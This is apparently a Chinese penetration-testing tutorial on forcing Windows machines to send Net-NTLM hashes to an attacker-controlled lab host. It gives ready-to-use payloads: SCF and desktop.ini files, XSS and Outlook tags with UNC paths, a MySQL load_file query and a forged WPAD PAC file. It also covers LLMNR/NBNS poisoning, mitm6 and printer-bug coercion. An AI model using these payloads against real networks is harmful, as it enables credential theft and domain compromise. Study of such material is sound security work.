## 前言

参考windows protocol进行实际操作，尝试从服务器向攻击者发起ntlm请求。

使用工具:Responder(可能会遇到版本较低问题，需要自己更新)

可能用到的机器

```
kali 192.168.30.128
pc 192.168.30.20
dc 192.168.30.10
win10 192.168.30.30
```

## 图标

**desktop.ini**

![deskktop](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/deskktop.png)

关闭推荐选项，即可看见隐藏的ini文件(看不见建议修改图标)

将该文件以记事本的方式开启，修改目标为攻击者，当用户访问该文件夹时，即可监听到net ntlm-hash

![evil](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/evil.png)

![v2hash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/v2hash.png)

**SCF文件**

文件夹底下含有scf后缀的文件时，scf文件包含了IconFile属性，Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式

```
[Shell]
Command=2
IconFile=\\192.168.30.128\scf\test.ico
[Taskbar]
Command=ToggleDesktop
```

当用户访问含有该文件的文件夹时，攻击者能够监听到用户的net-ntlm hash

**用户头像**

适用于Windows 10/2016/2019

在更改账户图片处。

用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。

## 系统命令携带UNC路径

思路都是利用UNC路径去访问，就和protocol里面说的一样，能执行命令干什么不行呢，知道就行

## XSS

利用XSS加载访问UNC路径

```xml
<script src="\\192.168.30.128\xss">
```

这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域

![20hash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/20hash.png)

当用户访问该存在xss的页面，将会UNC加载该路径，听到hash

接下来模拟使用http的情况

```xml
<script src="//192.168.30.128\xss">
```

这种情况会弹出认证框，导致我们监听失败

![box](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/box.png)

这是因为http协议导致的，smb协议会默认使用用户名和密码去自动登录，http协议则需要自行设置

![xss](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/xss.png)

选择使用当前用户名和密码自行登录后，再次访问该页面，就能监听到hash

![listenhash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/listenhash.png)

在默认配置下，构造unc访问smb协议，仅适用与ie和edge浏览器，http协议适用于所有浏览器，但是需要修改安全策略

但是在使用http协议时，如果访问站点的域名位于内网或者是信任列表时会直接登录

![priv](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/priv.png)

如果认证用户有创建所有子对象这一条权限，当我们获取到一个域内认证用户时，就可以添加一条DNS记录为域名，从而获取hash

(实际测试中这一条权限不是默认开启的)

## outlook

发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload

```xml
<img src="\\192.168.30.128\outlook">
```

## PDF

使用脚本将普通的pdf转化为恶意pdf文件

[worse-pdf](https://github.com/3gstudent/Worse-PDF)

用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行.

详细可以看3gstudent的博客

[pdf获取net-nelm hash](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PDF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96Net-NTLM-hash)

## Office

新建一个word，随便放一张图片

![word](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/word.png)

用7zip打开

进入word\_rels，修改document.xml.rels

可以看到Target参数本来是本地的路径，修改为UNC路径，然后加上`TargetMode="External"`

注意：似乎在较新的windows上已经没有这样的操作了，或许是我的环境有问题

## MySql

利用mysql的通信外带

load_file函数支持使用unc路径加载

需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)

只需要

```sql
select load_file('\\\\192.168.30.128\\mysql');
```

## NBNS&LLMNR

windows 解析域名的顺序是

- Hosts
- DNS (cache / server) 
- LLMNR
- NBNS 

如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析

### LLMNR

LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP/5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。

LLMNR 进行名称解析的过程为：

- 检查本地 NetBIOS 缓存
- 如果缓存中没有则会像当前子网域发送广播
- 当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败

也就是说LLMNR并不需要一个服务器，而是采用广播包的形式，去询问DNS，跟ARP很像，那跟ARP投毒一样的一个安全问题就会出现。

当受害者访问一个不存在的域名

![llmnr](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr.png)

向当前子网域发送广播，此时我们可以在攻击者的机器上发送响应包，告诉受害者我们就是他访问的这个域名，不就得到了受害者的net-ntlm hash吗，同样使用responsder进行实现

![llmnr2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr2.png)

![llmnr3](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr3.png)

### NBNS

全称是NetBIOS Name Service。

NetBIOS 协议进行名称解析的过程如下：

- 检查本地 NetBIOS 缓存
- 如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求
- 如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播
- 如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件

lmhosts 文件位于`C:\Windows\System32\drivers\etc\`目录中。

NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在。使用Responder也可以很方便得进行测试。这里不再重复展示。

## WPAD&mitm6

wpad 全称是Web Proxy Auto-Discovery Protocol ，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。

![lan-setting](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/lan-setting.png)

默认自动检测设置是开启的。

PAC文件的格式如下

```shell
function FindProxyForURL(url, host) {
   if (url== 'http://www.baidu.com/') return 'DIRECT';
   if (host== 'twitter.com') return 'SOCKS 127.0.0.10:7070';
   if (dnsResolve(host) == '10.0.0.100') return 'PROXY 127.0.0.1:8086;DIRECT';
   return 'DIRECT';
}
```

WPAD一般请求流程为

![t019d8c1f08fefc8c39](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/t019d8c1f08fefc8c39.png)

用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。

查询PAC文件的顺序如下：

1. 通过DHCP服务器
2. 查询WPAD主机的IP
   - Hosts
   - DNS (cache / server) 
   - LLMNR
   - NBNS 

### 配合LLMNR/NBNS投毒

用户在访问网页时，首先会查询PAC文件的位置。查询的地址是WPAD/wpad.dat。如果没有在域内专门配置这个域名的话，那么DNS解析失败的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少,这个时候我们就可以进行LLMNR投毒和NBNS投毒。

![dnc-llmnr](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/dnc-llmnr.png)

受害者访问WPAD/wpad.dat，Responder就能获取到用户的net-ntlm hash(这个Responder默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上`-F` 开启)

![isa](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/isa.png)

然后Responder通过伪造如下pac文件将代理指向 ISAProxySrv:3141

```python
function FindProxyForURL(url, host){
  if ((host == "localhost") 
      || shExpMatch(host, "localhost.*") 
      ||(host == "127.0.0.1") 
      || isPlainHostName(host)) return "DIRECT"; 
  if (dnsDomainIs(host, "RespProxySrv")
      ||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) 
                return "DIRECT"; 
  return 'PROXY ISAProxySrv:3141; DIRECT';}
```

受害者会使用ISAProxySrv:3141作为代理，但是受害者不知道ISAProxySrv对应的ip是什么，所以会再次查询，Responder再次通过llmnr投毒进行欺骗。将ISAProxySrv指向Responder本身。然后开始中间人攻击。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等，Responder都支持。

微软添加的保护措施让这种较老的攻击手法失效

1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。

2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询

### 配合DHCPv6

微软新增了两个措施，对应的有两个绕过方法。

**措施2**

第二个措施比较好绕过，毕竟responder也没有要求在下载PAC文件时获取hash，需要开F强制开启

给用户返回一个正常的wpad。将代理指向我们自己，当受害主机连接到我们的“代理”服务器时，我们可以通过HTTP CONNECT动作、或者GET请求所对应的完整URI路径来识别这个过程，然后回复HTTP 407错误（需要代理身份验证），这与401不同，IE/Edge以及Chrome浏览器（使用的是IE设置）会自动与代理服务器进行身份认证，即使在最新版本的Windows系统上也是如此。在Firefox中，用户可以配置这个选项，该选项默认处于启用状态。

**措施1**

系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP选项或DNS协议完成该任务。

在[MS16-077](https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14--2016)之后，通过DHCP和DNS协议还可以获取到pac文件。

DHCP和DNS都有指定的服务器，不是通过广播包，而且dhcp服务器和dns服务器我们是不可控的，没法进行投毒。

利用ipv6优先级高于ipv4，这里用到DHCPV6协议。

DHCPv6协议中，客户端通过向组播地址发送Solicit报文来定位DHCPv6服务器，组播地址[ff02::1:2]包括整个地址链路范围内的所有DHCPv6服务器和中继代理。DHCPv6四步交互过程，

> 客户端向[ff02::1:2]组播地址发送一个Solicit请求报文，

> DHCP服务器或中继代理回应Advertise消息告知客户端。

> 客户端选择优先级最高的服务器并发送Request信息请求分配地址或其他配置信息，

> 最后服务器回复包含确认地址，委托前缀和配置（如可用的DNS或NTP服务器）的Relay消息。

通俗点来说就是，在可以使用ipv6的情况(Windows Vista以后默认开启),攻击者能接收到其他机器的dhcpv6组播包的情况下，攻击者最后可以让受害者的DNS设置为攻击者的IPv6地址。

工具:[mitm6](https://github.com/dirkjanm/mitm6)

mitm6首先侦听攻击者计算机的某个网卡上的DHCPV6流量。当目标计算机重启或重新进行网络配置（如重新插入网线）时， 将会向DHCPv6发送请求获取IPv6配置mitm6将回复这些DHCPv6请求，并在链接本地范围内为受害者分配一个IPv6地址。

尽管在实际的IPv6网络中，这些地址是由主机自己自动分配的，不需要由DHCP服务器配置，但这使我们有机会将攻击者IP设置为受害者的默认IPv6 DNS服务器。

**注意：只适用于windows**

![12345](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/12345.png)

![1234566](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/1234566.png)

目标机器的DNS服务器的地址已经换为了攻击者的机器

## XXE && SSRF

XXE和ssrf的利用思路和前面无二，基本都是unc路径或者是http路径加载

在xxe和ssrf测试中一般要测试这两个方面

1. 支不支持UNC路径，比如`\\ip\x`或者`file://ip/x`
2. 支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的

## 打印机错误

比较常用的一个漏洞

Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。

任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。

通过脚本，我们可以让目标机器强制回连

[PetitPotem](https://github.com/topotam/PetitPotam)

由于机器版本问题，使用printerbug很可能出问题(函数调用问题)，ice师傅推荐了下面这个工具，函数fuzz测试，比较好用

[Coercer](https://github.com/p0dalirius/Coercer)

